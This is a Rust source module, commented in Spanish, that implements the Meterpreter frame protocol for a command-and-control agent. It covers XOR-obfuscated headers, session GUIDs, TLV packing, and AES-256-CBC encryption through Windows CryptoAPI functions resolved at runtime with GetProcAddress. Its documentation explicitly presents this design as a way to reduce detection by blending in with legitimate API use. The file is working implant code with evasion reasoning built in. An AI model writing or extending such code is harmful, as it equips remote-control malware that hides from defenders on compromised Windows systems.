//! # Meterpreter Frame Protocol (Windows CryptoAPI Implementation)
//!
//! Este módulo implementa el mismo protocolo de framing que `crates/core/src/meterpreter.rs`,
//! pero usando las APIs de criptografía nativas de Windows (CryptoAPI/advapi32.dll) en lugar
//! de las crates Rust `aes` y `cbc`.
//!
//! ## ¿Por qué usar Windows CryptoAPI?
//!
//! En el contexto de un agente C2, usar las APIs nativas de Windows tiene ventajas:
//!
//! 1. **Sin dependencias externas**: No necesita compilar código AES, reduciendo tamaño
//! 2. **Menor detección**: Las llamadas a CryptoAPI son legítimas y comunes
//! 3. **Compatibilidad**: Funciona en cualquier versión de Windows con soporte AES
//! 4. **Resolución dinámica**: Se resuelven las funciones con GetProcAddress
//!
//! ## Funciones de CryptoAPI usadas
//!
//! | Función | Propósito |
//! |---------|-----------|
//! | CryptAcquireContextW | Obtener contexto del proveedor criptográfico |
//! | CryptGenRandom | Generar bytes aleatorios (para IV) |
//! | CryptImportKey | Importar clave AES-256 en formato PLAINTEXTKEYBLOB |
//! | CryptSetKeyParam | Configurar modo CBC y IV |
//! | CryptEncrypt | Encriptar datos con padding PKCS7 |
//! | CryptDecrypt | Desencriptar datos |
//! | CryptDestroyKey | Liberar handle de clave |
//! | CryptReleaseContext | Liberar contexto del proveedor |
//!
//! ## Formato de la clave (PLAINTEXTKEYBLOB)
//!
//! Para importar una clave AES-256, se construye un blob con la siguiente estructura:
//!
//! ```text
//! struct Aes256KeyBlob {
//!     header: BLOBHEADER {  // 8 bytes
//!         b_type: 0x08,     // PLAINTEXTKEYBLOB
//!         b_version: 0x02,  // CUR_BLOB_VERSION
//!         reserved: 0x0000,
//!         ai_key_alg: 0x00006610, // CALG_AES_256
//!     },
//!     length: u32,          // 32 (tamaño de la clave)
//!     key: [u8; 32],        // La clave AES
//! }
//! ```
//!
//! ## Diferencias con la implementación Rust
//!
//! | Aspecto | Rust (aes/cbc) | Windows CryptoAPI |
//! |---------|----------------|-------------------|
//! | Tamaño | Mayor (incluye lib) | Menor (usa DLL del sistema) |
//! | Detección | Fácil de detectar | Se mezcla con uso legítimo |
//! | Portabilidad | Multiplataforma | Solo Windows |
//! | Dependencias | Crates Rust | advapi32.dll |

use std::vec::Vec;

use core_defs::packer::{mp_pack_tlvs, mp_unpack_tlvs, MpTlv};
use get_proc::{CastFunc, GetModuleHandle, GetProcAddress};
use rand::RngCore;

/// Sin encriptación - payload en texto plano.
pub const ENC_FLAG_NONE: u32 = 0x0;

/// Encriptación AES-256-CBC activa.
pub const ENC_FLAG_AES256: u32 = 0x1;

/// Tamaño de bloque AES en bytes.
const AES_BLOCK: usize = 16;

/// Header parseado de un frame Meterpreter.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct MpHeader {
    /// Clave XOR para ofuscación.
    pub xor_key: [u8; 4],
    /// Identificador único de sesión.
    pub session_guid: [u8; 16],
    /// Flags de encriptación.
    pub enc_flags: u32,
    /// Longitud del payload + 8.
    pub length: u32,
    /// Tipo de paquete.
    pub typ: u32,
}

// ============================
// Type definitions para CryptoAPI
// ============================

/// Handle a un proveedor criptográfico (HCRYPTPROV).
type HCRYPTPROV = usize;

/// Handle a una clave criptográfica (HCRYPTKEY).
type HCRYPTKEY = usize;

// Funciones de CryptoAPI (advapi32.dll)
type CryptAcquireContextWFn = extern "system" fn(*mut HCRYPTPROV, *const u16, *const u16, u32, u32) -> i32;
type CryptReleaseContextFn = extern "system" fn(HCRYPTPROV, u32) -> i32;
type CryptGenRandomFn = extern "system" fn(HCRYPTPROV, u32, *mut u8) -> i32;
type CryptImportKeyFn = extern "system" fn(HCRYPTPROV, *const u8, u32, HCRYPTKEY, u32, *mut HCRYPTKEY) -> i32;
type CryptSetKeyParamFn = extern "system" fn(HCRYPTKEY, u32, *const u8, u32) -> i32;
type CryptEncryptFn = extern "system" fn(HCRYPTKEY, usize, i32, u32, *mut u8, *mut u32, u32) -> i32;
type CryptDecryptFn = extern "system" fn(HCRYPTKEY, usize, i32, u32, *mut u8, *mut u32) -> i32;
type CryptDestroyKeyFn = extern "system" fn(HCRYPTKEY) -> i32;

// Constantes de CryptoAPI
const PROV_RSA_AES: u32 = 24;           // Proveedor que soporta AES
const CRYPT_VERIFYCONTEXT: u32 = 0xF000_0000;  // Usar contexto temporal

const PLAINTEXTKEYBLOB: u8 = 0x08;      // Tipo de blob para clave en texto plano
const CUR_BLOB_VERSION: u8 = 0x02;      // Versión actual del blob
const CALG_AES_256: u32 = 0x0000_6610;  // Algoritmo AES-256

const KP_MODE: u32 = 4;                 // Parámetro: modo de encadenamiento
const KP_IV: u32 = 1;                   // Parámetro: vector de inicialización
const CRYPT_MODE_CBC: u32 = 1;          // Modo CBC (Cipher Block Chaining)

/// Header del blob para importar clave AES.
#[repr(C)]
struct BLOBHEADER {
    /// Tipo de blob (PLAINTEXTKEYBLOB = 0x08).
    b_type: u8,
    /// Versión del blob (CUR_BLOB_VERSION = 0x02).
    b_version: u8,
    /// Reservado, debe ser 0.
    reserved: u16,
    /// Algoritmo de la clave (CALG_AES_256).
    ai_key_alg: u32,
}

/// Blob completo para importar clave AES-256.
///
/// Este struct se pasa a CryptImportKey para cargar la clave
/// en el proveedor criptográfico de Windows.
#[repr(C)]
struct Aes256KeyBlob {
    /// Header con metadatos del blob.
    header: BLOBHEADER,
    /// Longitud de la clave en bytes (32).
    length: u32,
    /// La clave AES-256 propiamente dicha.
    key: [u8; 32],
}

/// Cache de funciones de CryptoAPI resueltas dinámicamente.
#[derive(Clone, Copy)]
struct Advapi32 {
    /// CryptAcquireContextW - obtener contexto del proveedor.
    acquire: CryptAcquireContextWFn,
    /// CryptReleaseContext - liberar contexto.
    release: CryptReleaseContextFn,
    /// CryptGenRandom - generar bytes aleatorios.
    gen_random: CryptGenRandomFn,
    /// CryptImportKey - importar clave desde blob.
    import_key: CryptImportKeyFn,
    /// CryptSetKeyParam - configurar parámetros de clave.
    set_key_param: CryptSetKeyParamFn,
    /// CryptEncrypt - encriptar datos.
    encrypt: CryptEncryptFn,
    /// CryptDecrypt - desencriptar datos.
    decrypt: CryptDecryptFn,
    /// CryptDestroyKey - destruir handle de clave.
    destroy_key: CryptDestroyKeyFn,
}

/// Resuelve las funciones de CryptoAPI desde advapi32.dll.
///
/// ## Proceso
///
/// 1. Obtiene handle de advapi32.dll con GetModuleHandle
/// 2. Resuelve cada función con GetProcAddress
/// 3. Convierte los punteros a function pointers con cast_to_function
///
/// ## Retorna
///
/// - `Some(Advapi32)`: Struct con todas las funciones resueltas
/// - `None`: Si no se pudo resolver alguna función
fn load_advapi32() -> Option<Advapi32> {
    let h = GetModuleHandle(Some("advapi32.dll"))?;
    Some(Advapi32 {
        acquire: GetProcAddress(h.clone(), "CryptAcquireContextW")?.cast_to_function(),
        release: GetProcAddress(h.clone(), "CryptReleaseContext")?.cast_to_function(),
        gen_random: GetProcAddress(h.clone(), "CryptGenRandom")?.cast_to_function(),
        import_key: GetProcAddress(h.clone(), "CryptImportKey")?.cast_to_function(),
        set_key_param: GetProcAddress(h.clone(), "CryptSetKeyParam")?.cast_to_function(),
        encrypt: GetProcAddress(h.clone(), "CryptEncrypt")?.cast_to_function(),
        decrypt: GetProcAddress(h.clone(), "CryptDecrypt")?.cast_to_function(),
        destroy_key: GetProcAddress(h.clone(), "CryptDestroyKey")?.cast_to_function(),
    })
}

/// Aplica ofuscación XOR a un slice de bytes.
fn xor_bytes(xk: [u8; 4], data: &mut [u8]) {
    for (i, b) in data.iter_mut().enumerate() {
        *b ^= xk[i % 4];
    }
}

/// Obtiene un contexto del proveedor criptográfico RSA/AES.
///
/// ## Argumentos
///
/// - `adv`: Struct con funciones de CryptoAPI
///
/// ## Retorna
///
/// Handle al proveedor (HCRYPTPROV) o None si falla.
fn acquire_provider(adv: Advapi32) -> Option<HCRYPTPROV> {
    let mut prov: HCRYPTPROV = 0;
    let ok = (adv.acquire)(
        &mut prov as *mut _,
        std::ptr::null(),
        std::ptr::null(),
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT,
    );
    if ok != 0 { Some(prov) } else { None }
}

/// Importa una clave AES-256 al proveedor criptográfico.
///
/// ## Proceso
///
/// 1. Construye un Aes256KeyBlob con la clave
/// 2. Llama a CryptImportKey con el blob
///
/// ## Argumentos
///
/// - `adv`: Funciones de CryptoAPI
/// - `prov`: Handle del proveedor
/// - `key`: Clave AES-256 de 32 bytes
///
/// ## Retorna
///
/// Handle a la clave (HCRYPTKEY) o None si falla.
fn import_aes_key(adv: Advapi32, prov: HCRYPTPROV, key: &[u8; 32]) -> Option<HCRYPTKEY> {
    let blob = Aes256KeyBlob {
        header: BLOBHEADER {
            b_type: PLAINTEXTKEYBLOB,
            b_version: CUR_BLOB_VERSION,
            reserved: 0,
            ai_key_alg: CALG_AES_256,
        },
        length: 32,
        key: *key,
    };
    let mut hkey: HCRYPTKEY = 0;
    let ok = (adv.import_key)(
        prov,
        &blob as *const _ as *const u8,
        std::mem::size_of::<Aes256KeyBlob>() as u32,
        0,
        0,
        &mut hkey as *mut _,
    );
    if ok == 0 {
        None
    } else {
        Some(hkey)
    }
}

/// Encripta datos con AES-256-CBC usando CryptoAPI.
///
/// ## Proceso
///
/// 1. Adquiere contexto del proveedor criptográfico
/// 2. Importa la clave AES
/// 3. Configura modo CBC
/// 4. Genera IV aleatorio
/// 5. Encripta con padding PKCS7 automático
/// 6. Prepende IV al ciphertext
///
/// ## Argumentos
///
/// - `adv`: Funciones de CryptoAPI
/// - `aes_key`: Clave AES-256 de 32 bytes
/// - `plain`: Datos a encriptar
///
/// ## Retorna
///
/// Vector con IV (16 bytes) + ciphertext, o None si falla.
fn aes_encrypt_cbc_pkcs7(adv: Advapi32, aes_key: &[u8; 32], plain: &[u8]) -> Option<Vec<u8>> {
    let prov = acquire_provider(adv)?;
    let key = import_aes_key(adv, prov, aes_key)?;

    let block = AES_BLOCK;

    // Configurar modo CBC
    let mode = CRYPT_MODE_CBC.to_le_bytes();
    let _ = (adv.set_key_param)(key, KP_MODE, mode.as_ptr(), 0);

    // Generar IV aleatorio
    let mut iv = vec![0u8; block];
    let ok_rng = (adv.gen_random)(prov, iv.len() as u32, iv.as_mut_ptr());
    if ok_rng == 0 {
        // Fallback a rand crate si CryptGenRandom falla
        rand::thread_rng().fill_bytes(&mut iv);
    }
    let _ = (adv.set_key_param)(key, KP_IV, iv.as_ptr(), 0);

    // Preparar buffer para encriptación
    // CryptoAPI necesita buffer extra para padding PKCS7
    let max = (plain.len() + block) as u32;
    let mut buf = plain.to_vec();
    buf.resize(max as usize, 0u8);
    let mut len: u32 = plain.len() as u32;

    // Encriptar
    let ok_enc = (adv.encrypt)(key, 0, 1, 0, buf.as_mut_ptr(), &mut len as *mut u32, max);

    // Cleanup
    let _ = (adv.destroy_key)(key);
    let _ = (adv.release)(prov, 0);

    if ok_enc == 0 {
        return None;
    }

    buf.truncate(len as usize);

    // Retornar IV + ciphertext
    let mut out = Vec::with_capacity(iv.len() + buf.len());
    out.extend_from_slice(&iv);
    out.extend_from_slice(&buf);
    Some(out)
}

/// Desencripta datos con AES-256-CBC usando CryptoAPI.
///
/// ## Proceso
///
/// 1. Adquiere contexto del proveedor criptográfico
/// 2. Importa la clave AES
/// 3. Extrae IV de los primeros 16 bytes del payload
/// 4. Configura modo CBC y IV
/// 5. Desencripta (CryptoAPI remueve padding PKCS7 automáticamente)
///
/// ## Argumentos
///
/// - `adv`: Funciones de CryptoAPI
/// - `aes_key`: Clave AES-256 de 32 bytes
/// - `payload`: IV (16 bytes) + ciphertext
///
/// ## Retorna
///
/// Datos desencriptados o None si falla.
fn aes_decrypt_cbc_pkcs7(adv: Advapi32, aes_key: &[u8; 32], payload: &[u8]) -> Option<Vec<u8>> {
    let prov = acquire_provider(adv)?;
    let key = import_aes_key(adv, prov, aes_key)?;

    let block = AES_BLOCK;
    if payload.len() < block {
        let _ = (adv.destroy_key)(key);
        let _ = (adv.release)(prov, 0);
        return None;
    }

    // Extraer IV y ciphertext
    let iv = &payload[..block];
    let ct = &payload[block..];

    // Configurar modo CBC y IV
    let mode = CRYPT_MODE_CBC.to_le_bytes();
    let _ = (adv.set_key_param)(key, KP_MODE, mode.as_ptr(), 0);
    let _ = (adv.set_key_param)(key, KP_IV, iv.as_ptr(), 0);

    // Desencriptar
    let mut buf = ct.to_vec();
    let mut len: u32 = buf.len() as u32;
    let ok_dec = (adv.decrypt)(key, 0, 1, 0, buf.as_mut_ptr(), &mut len as *mut u32);

    // Cleanup
    let _ = (adv.destroy_key)(key);
    let _ = (adv.release)(prov, 0);

    if ok_dec == 0 {
        return None;
    }

    buf.truncate(len as usize);
    Some(buf)
}

/// Codifica TLVs en un frame Meterpreter completo.
///
/// Esta función es equivalente a `core_defs::meterpreter::encode_frame` pero
/// usa Windows CryptoAPI para la encriptación AES.
///
/// ## Argumentos
///
/// - `session_guid`: Identificador de sesión (16 bytes)
/// - `pkt_type`: Tipo de paquete
/// - `tlvs`: TLVs a codificar
/// - `aes_key`: Clave AES opcional (Some para encriptar, None para texto plano)
///
/// ## Retorna
///
/// Frame completo listo para enviar.
pub fn encode_frame(session_guid: [u8; 16], pkt_type: u32, tlvs: &[MpTlv], aes_key: Option<&[u8; 32]>) -> Vec<u8> {
    let mut payload = mp_pack_tlvs(tlvs);
    let mut enc_flags = ENC_FLAG_NONE;

    if let Some(key) = aes_key {
        if let Some(adv) = load_advapi32() {
            if let Some(p) = aes_encrypt_cbc_pkcs7(adv, key, &payload) {
                payload = p;
                enc_flags = ENC_FLAG_AES256;
            }
        }
    }

    let length_field: u32 = 8u32 + (payload.len() as u32);

    let mut xor_key = [0u8; 4];
    rand::thread_rng().fill_bytes(&mut xor_key);

    let mut header = [0u8; 32];
    header[0..4].copy_from_slice(&xor_key);
    header[4..20].copy_from_slice(&session_guid);
    header[20..24].copy_from_slice(&enc_flags.to_be_bytes());
    header[24..28].copy_from_slice(&length_field.to_be_bytes());
    header[28..32].copy_from_slice(&pkt_type.to_be_bytes());

    let mut out = Vec::with_capacity(32 + payload.len());
    out.extend_from_slice(&header);
    out.extend_from_slice(&payload);
    xor_bytes(xor_key, &mut out[4..]);
    out
}

/// Decodifica un frame Meterpreter a header y TLVs.
///
/// Esta función es equivalente a `core_defs::meterpreter::decode_frame` pero
/// usa Windows CryptoAPI para la desencriptación AES.
///
/// ## Argumentos
///
/// - `frame`: Frame completo recibido
/// - `aes_key`: Clave AES opcional (requerida si enc_flags == AES256)
///
/// ## Retorna
///
/// - `Ok((MpHeader, Vec<MpTlv>))`: Header y TLVs parseados
/// - `Err(&'static str)`: Error de parsing o desencriptación
pub fn decode_frame(frame: &[u8], aes_key: Option<&[u8; 32]>) -> Result<(MpHeader, Vec<MpTlv>), &'static str> {
    if frame.len() < 32 {
        return Err("short frame");
    }

    let mut buf = frame.to_vec();
    let xor_key = [buf[0], buf[1], buf[2], buf[3]];
    if buf.len() > 4 {
        xor_bytes(xor_key, &mut buf[4..]);
    }

    let enc_flags = u32::from_be_bytes([buf[20], buf[21], buf[22], buf[23]]);
    let length_be = u32::from_be_bytes([buf[24], buf[25], buf[26], buf[27]]);
    let typ_be = u32::from_be_bytes([buf[28], buf[29], buf[30], buf[31]]);

    let payload_len = length_be.saturating_sub(8) as usize;
    if 32 + payload_len > buf.len() {
        return Err("length mismatch");
    }

    let payload = &buf[32..32 + payload_len];

    let plain = if enc_flags == ENC_FLAG_AES256 {
        let key = aes_key.ok_or("missing aes key")?;
        let adv = load_advapi32().ok_or("advapi32")?;
        aes_decrypt_cbc_pkcs7(adv, key, payload).ok_or("decrypt")?
    } else {
        payload.to_vec()
    };

    let (tlvs, _used) = mp_unpack_tlvs(&plain).map_err(|_| "tlv decode")?;

    let mut guid = [0u8; 16];
    guid.copy_from_slice(&buf[4..20]);
    let header = MpHeader {
        xor_key,
        session_guid: guid,
        enc_flags,
        length: length_be,
        typ: typ_be,
    };
    Ok((header, tlvs))
}
